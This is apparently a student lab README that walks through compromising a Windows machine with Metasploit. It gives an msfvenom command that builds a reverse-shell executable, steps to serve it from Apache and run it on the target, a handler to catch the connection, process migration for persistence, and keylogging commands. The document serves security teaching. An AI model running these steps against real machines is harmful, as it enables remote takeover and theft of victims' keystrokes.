# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:

![325062710-3c2a2010-2359-4571-a58f-d200759f34a8](https://github.com/manikandan26052004/Compromising-windows-using-Metasploit/assets/121999845/db2aa273-1e2e-4736-99f5-295937b38cd0)

Create a malicious executable file fun.exe using msenom command msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe

## OUTPUT:

![325062765-b99a4e6b-48a1-4a07-8489-4369121bea5c](https://github.com/manikandan26052004/Compromising-windows-using-Metasploit/assets/121999845/f9deb0ac-da69-4d20-8ec6-4e05d33bb3bd)

copy the fun.exe into the apache /var/www/html folder

![325062844-40497d17-096b-46cf-a6cc-ca3372776719](https://github.com/manikandan26052004/Compromising-windows-using-Metasploit/assets/121999845/ea569f58-a606-419f-bceb-b522800f6eb7)

Start apache server sudo systemctl apache2 start

![325062910-66a0c1b4-52d0-4391-979f-f0a2c44e1643](https://github.com/manikandan26052004/Compromising-windows-using-Metasploit/assets/121999845/c51ead63-872b-4e83-bcab-acc7b313d410)

Check the status of apache2

![325062991-a31e9020-30ea-4761-8af3-c5b98f51a367](https://github.com/manikandan26052004/Compromising-windows-using-Metasploit/assets/121999845/6384bf9a-505a-478a-936c-e866a9e89905)

Invoke msfconsole:

## OUTPUT:
Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.

Starting a command and control Server use multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 0.0.0.0 exploit
![325063108-dd19969a-4a23-4793-9976-e15ad7bbd664](https://github.com/manikandan26052004/Compromising-windows-using-Metasploit/assets/121999845/640efb0c-9499-442f-9bd1-b1ab99b509d6)

On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: http://192.168.1.2/fun.exe The file "fun.exe" downloads.
![325063334-5f1f0412-7440-4ead-9a2f-8be93ce7ff16](https://github.com/manikandan26052004/Compromising-windows-using-Metasploit/assets/121999845/0b551c0e-36e3-404f-937b-73bc302f7aca)

Bypass any warning boxes, double-click the file, and allow it to run.

On kali give the command exploit

![325063408-949a0b8f-4725-4c59-9441-9271a1d2c223](https://github.com/manikandan26052004/Compromising-windows-using-Metasploit/assets/121999845/5d050551-88f8-41f5-9c6c-e5d902cc71d2)

To see a list of processes, at the meterpreter > prompt, execute this command: ps ⇒ can see the fun.exe process running with pid 1156

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost. To become more persistent, we'll migrate to a process that will last longer. Let's migrate to the winlogon process. At the meterpreter > prompt, execute this command:

migrate -N explorer.exe at meterpreter > prompt, execute this command: netstat A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below. Notice the "PID/Program name" value for this connection, which is redacted

![325063590-b12a63f9-4971-49e6-b66f-3a672f73c439](https://github.com/manikandan26052004/Compromising-windows-using-Metasploit/assets/121999845/effb17bc-3537-4b14-83b8-196b0ab5a793)

Post Exploitation The target is now owned. Following are meterpreter commands for key capturing in the target machine keyscan_start Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.

![325063711-1fa5d8d0-eeef-4ef1-a2be-9795445f1e30](https://github.com/manikandan26052004/Compromising-windows-using-Metasploit/assets/121999845/739754ed-1afd-4a44-b560-6bfcf18352fb)

keyscan_dump Shows the keystrokes captured so far

![325063761-15941174-012b-4f93-b402-805ed8aa92a1](https://github.com/manikandan26052004/Compromising-windows-using-Metasploit/assets/121999845/2e727753-625c-4c62-8c0f-667049ddedcb)

## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
